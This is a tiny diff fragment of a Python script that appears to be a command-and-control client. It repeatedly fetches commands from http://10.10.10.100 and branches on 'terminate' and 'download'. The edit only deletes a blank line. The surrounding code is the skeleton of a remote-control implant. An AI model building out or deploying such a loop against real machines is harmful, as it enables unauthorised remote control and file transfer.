@@ -6,7 +6,6 @@ import time
 while True:
     req = requests.get('http://10.10.10.100')
     command = req.text
-
     if 'terminate' in command:
         break
     elif 'download' in command:
